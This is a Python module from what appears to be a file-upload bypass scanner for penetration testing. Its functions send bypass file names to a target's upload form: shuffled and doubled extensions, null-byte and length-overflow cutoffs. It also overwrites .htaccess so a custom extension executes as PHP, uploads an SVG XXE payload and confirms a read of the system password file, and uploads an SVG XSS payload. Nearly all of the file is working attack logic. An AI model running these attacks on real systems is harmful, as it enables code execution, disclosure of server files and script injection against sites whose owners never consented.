#!/usr/bin/env python3

# importing necessary modules
from .alerts import *
from .random_string import generate_random_string
from .capitalise_random import *
from .state import save_state
from .file_upload import *
import time


# All Active Modules        
def extension_shuffle(request_file, options, allowed_extension, function_number, total_functions,
                      internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "extension_shuffle"
    state_extensions = []

    try:
        info("Executing extensions shuffle module.")

        extension_to_test = options.file_extension

        internal_total_iterations = len(config.extensions[extension_to_test])

        internal_progress = 0

        for backend_extension in config.extensions[extension_to_test]:

            # Collect extensions for a resume state
            state_extensions.append(backend_extension)

            # Calculate the progress bar according to the number of functions and iterations
            internal_progress += 1
            overall_progress = (function_number - 1) / total_functions * 100 + (
                        internal_progress / internal_total_iterations) / total_functions * 100

            # A state condition to remove extensions that the program already checked
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            # Send the request
            file_extension = f".{backend_extension}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

            # Change the extension to a random casing
            extension_random = capitalise_random(backend_extension)
            file_extension = f".{extension_random}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def double_extension(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
                     internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "double_extension"
    state_extensions = []

    try:
        extension_to_test = options.file_extension

        info(f"Executing Double Extension module.")

        internal_total_iterations = len(config.extensions[extension_to_test])

        internal_progress = 0

        for backend_extension in config.extensions[extension_to_test]:

            # Collect extensions for a resume state
            state_extensions.append(backend_extension)

            # Calculate the progress bar according to the number of functions and iterations
            internal_progress += 1
            overall_progress = (function_number - 1) / total_functions * 100 + (
                        internal_progress / internal_total_iterations) / total_functions * 100

            # A state condition to remove extensions that the program already checked
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            # Send the request
            file_extension = f".{backend_extension}.{backend_extension}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

            # Send the request with a random capitalization
            extension_random = capitalise_random(backend_extension)
            file_extension = f".{extension_random}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def forward_double_extension(request_file, options, allowed_extension, function_number, total_functions,
                             internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "forward_double_extension"
    state_extensions = []

    try:
        extension_to_test = options.file_extension
        info(f"Executing Forward Double Extension module.")

        internal_total_iterations = len(config.extensions[extension_to_test])

        internal_progress = 0

        for backend_extension in config.extensions[extension_to_test]:

            # A state condition to remove extensions that the program already checked
            state_extensions.append(backend_extension)

            # Calculate the progress bar according to the number of functions and iterations
            internal_progress += 1
            overall_progress = (function_number - 1) / total_functions * 100 + (
                        internal_progress / internal_total_iterations) / total_functions * 100

            # A condition for a resume state
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            # Send a request
            file_extension = f".{allowed_extension}.{backend_extension}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def reverse_double_extension(request_file, options, allowed_extension, function_number, total_functions,
                             internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "reverse_double_extension"
    state_extensions = []

    try:
        extension_to_test = options.file_extension
        info(f"Testing Reverse Double Extension module.")

        internal_total_iterations = len(config.extensions[extension_to_test])

        internal_progress = 0

        for backend_extension in config.extensions[extension_to_test]:

            # Collect extensions for a resume state
            state_extensions.append(backend_extension)

            # Calculate the progress bar according to the number of functions and iterations
            internal_progress += 1
            overall_progress = (function_number - 1) / total_functions * 100 + (
                        internal_progress / internal_total_iterations) / total_functions * 100

            # A state condition to remove extensions that the program already checked
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            # Send a request
            file_extension = f".{backend_extension}.{allowed_extension}"
            file_name = generate_random_string(10) + file_extension
            _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                allowed_extension, overall_progress)

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def null_byte_cutoff(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
                     internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "null_byte_cutoff"
    state_extensions = []

    try:
        info("Executing Null byte cutoff module.")
        extension_to_test = options.file_extension

        internal_progress = 0

        # Too many iterations otherwise
        shortened_php_extension_list = config.extensions[extension_to_test][:4]

        # Save extensions and null bytes chars length
        internal_total_iterations = len(shortened_php_extension_list)
        null_total_iterations = len(config.null_bytes)

        for backend_extension in shortened_php_extension_list:

            # Collect extensions for a resume state
            state_extensions.append(backend_extension)

            # Calculate the progress increment for each internal iteration
            internal_progress_increment = (100 / total_functions) / internal_total_iterations

            # Calculate the initial progress for this internal iteration
            start_progress = (function_number - 1) / total_functions * 100 + internal_progress * internal_progress_increment

            # A state condition to remove extensions that the program already checked
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            null_progress = 0
            # Iterate null bytes chars     
            for null_byte in config.null_bytes:
                # Increment null bytes progress
                null_progress += 1
                overall_progress = start_progress + (
                            null_progress / null_total_iterations) * internal_progress_increment

                # Send the request
                file_extension = f".{backend_extension}{null_byte}.{allowed_extension}"
                file_name = generate_random_string(10) + file_extension

                _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                    allowed_extension, overall_progress)

            internal_progress += 1

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def name_overflow_cutoff(request_file, options, allowed_extension, function_number, total_functions,
                         internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
    # Save module name and extensions for a state file
    module = "name_overflow_cutoff"
    state_extensions = []

    try:
        info("Executing Name Overflow Cutoff Module")
        extension_to_test = options.file_extension

        overflow_lengths = [255, 236]  # You may adjust this based on the system's allowed characters length

        internal_total_iterations = len(config.extensions[extension_to_test])

        internal_progress = 0

        for backend_extension in config.extensions[extension_to_test]:

            # Collect extensions for a resume state
            state_extensions.append(backend_extension)

            # Calculate the progress bar according to the number of functions and iterations
            internal_progress += 1
            overall_progress = (function_number - 1) / total_functions * 100 + (
                        internal_progress / internal_total_iterations) / total_functions * 100

            # A state condition to remove extensions that the program already checked
            if leftover_extensions is not None and backend_extension in leftover_extensions:
                continue

            # Iterate between different lengths, it's not an exact science, you can play with it            
            for overflow_length in overflow_lengths:
                # Send the request
                file_extension = f".{backend_extension}.{allowed_extension}"
                # Double A with the overflow length and subtracts the extension and finally adds the full extension
                # You can read about it in Hacktricks(File upload)
                file_name = ("A" * (overflow_length - (len(backend_extension) + 1))) + file_extension
                _, _ = send_request(backend_extension, request_file, file_name, extension_to_test, options, module,
                                    allowed_extension, overall_progress)

    except KeyboardInterrupt:
        # Save the state when keyboard exception is caught
        if len(state_extensions) > 0:
            save_state(options, module, allowed_extension, function_number, internal_progress,
                       internal_total_iterations, total_functions, state_extensions)


def htaccess_overwrite(request_file, options, allowed_extension, function_number, total_functions,
                       internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
    extension_to_test = options.file_extension
    module = 'htaccess_overwrite'
    # Check if the file extension being tested is PHP (it works only with php)
    if extension_to_test.lower() == 'php':

        info("Executing .htaccess overwrite module.")

        # Calculate the progress bar
        overall_progress = (function_number - 1) / total_functions * 100 + (1 / 1) / total_functions * 100

        # Upload an arbitrary file extension
        php_file_extension = f".arbit"
        magic_bytes = False
        mimetype = config.mimetypes["txt"]
        file_name = generate_random_string(10) + php_file_extension
        skip_module = True  # Do not exit when a successful upload is occurred
        _, upload_status, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options, magic_bytes,
                                                      allowed_extension, mimetype, module, overall_progress, None,
                                                      skip_module)

        if upload_status == "fail":
            warning("The form doesn't seem to allow arbitrary file extensions, probably a blacklist.")
            return

        # Upload .htaccess file that overwrite the existing .htaccess and processes .arbit as PHP
        with open("assets/samples/.htaccess", 'rb') as file:
            file_data = file.read()

        # Send the request with .htaccess data   
        file_name = ".htaccess"
        _, upload_status, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options, magic_bytes,
                                                      allowed_extension, mimetype, module, overall_progress, file_data,
                                                      skip_module)

        # Upload the arbitrary file extension again
        if upload_status == "success":
            time.sleep(1.5)
            php_file_extension = f".arbit"
            mimetype = config.mimetypes["php"]
            file_name = generate_random_string(10) + php_file_extension
            warning(f"Trying to upload {file_name}")
            time.sleep(1.5)
            _, upload_status, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options,
                                                          magic_bytes, allowed_extension, mimetype, overall_progress)


def svg_xxe(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
            internal_total_iterations=None, leftover_extensions=None):
    module = 'svg_xxe'

    info("Executing XML External Entity with SVG module.")

    # Calculate the progress bar
    overall_progress = (function_number - 1) / total_functions * 100 + (1 / 1) / total_functions * 100

    mimetype = config.mimetypes["svg"]
    file_extension = f"svg"
    magic_bytes = False
    skip_module = True  # Do not exit when a successful upload is occurred
    file_name = generate_random_string(10) + "." + file_extension
    with open("assets/samples/svg_xxe.svg", 'rb') as file:
        file_data = file.read()

    # Upload the request with a svg data
    headers, upload_status, response, url, _, current_time, user_options = file_upload(request_file, file_name,
                                                                                       file_extension, options,
                                                                                       magic_bytes, allowed_extension,
                                                                                       mimetype, module,
                                                                                       overall_progress, file_data,
                                                                                       skip_module)
    if upload_status == 'success':

        if options.upload_dir != 'optional':
            # Build a URL path to check if the XXE is reflected in the response 
            from urllib.parse import urljoin
            upload_dir = options.upload_dir
            if options.upload_dir.endswith("=/"):
                upload_dir = options.upload_dir[:-1]
            final_url = urljoin(url, upload_dir + file_name)
            response, _ = send_get_request(headers, options, final_url)

            # Check for a root user in response
            if "root:" in response.text:
                printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                success("XXE confirmed!")
                info(f"URL: {final_url}")
                if not options.bruteForce:
                    exit(1)
                else:
                    return
            else:
                printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                warning("Couldn't find XXE in response, you might want to check it manually.")
                if not options.bruteForce:
                    exit(1)
                else:
                    return
        else:
            printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
            warning("Manually check if the XXE is present in the uploaded path when accessed.")
            if not options.bruteForce:
                exit(1)
            else:
                return


def svg_xss(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None,
            internal_total_iterations=None, leftover_extensions=None):
    module = 'svg_xss'

    info("Executing Cross-Site Scripting with SVG module.")

    # Calculate the progress bar
    overall_progress = (function_number - 1) / total_functions * 100 + (1 / 1) / total_functions * 100

    file_extension = f"svg"
    mimetype = config.mimetypes["svg"]
    magic_bytes = False
    file_name = generate_random_string(10) + "." + file_extension
    with open("assets/samples/svg_xss.svg", 'rb') as file:
        file_data = file.read()

    xss_payload = "<script type=\"text/javascript\">alert(\"document.domain\");</script>"  # XSS payload to check in the response
    skip_module = True  # Do not exit when a successful upload is occurred
    headers, upload_status, response, url, _, current_time, user_options = file_upload(request_file, file_name,
                                                                                       file_extension, options,
                                                                                       magic_bytes, allowed_extension,
                                                                                       mimetype, module,
                                                                                       overall_progress, file_data,
                                                                                       skip_module)

    if upload_status == 'success':

        if options.upload_dir != 'optional':
            # Build a URL path to check if the XSS is reflected in the response 
            from urllib.parse import urljoin
            upload_dir = options.upload_dir
            if options.upload_dir.endswith("=/"):
                upload_dir = options.upload_dir[:-1]
            final_url = urljoin(url, upload_dir + file_name)
            response, _ = send_get_request(headers, options, final_url)
            content_type = response.headers.get("Content-Type")

            # Check if the XSS payload is in the response and text/html or javascript returned as a content type
            if xss_payload in response.text and "javascript" in content_type or xss_payload in response.text and "text/html" in content_type or xss_payload in response.text and "image/svg+xml" in content_type:
                printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)

                success("XSS is reflected and confirmed!")
                info(f"URL: {final_url}")
                if not options.bruteForce:
                    exit(1)
                else:
                    return
            else:
                printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
                warning("Couldn't find XSS in response, you might want to check it manually.")
                if not options.bruteForce:
                    exit(1)
                else:
                    return
        else:
            printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
            warning("Manually check if the XSS is present in the uploaded path when accessed.")
            if not options.bruteForce:
                exit(1)
            else:
                return
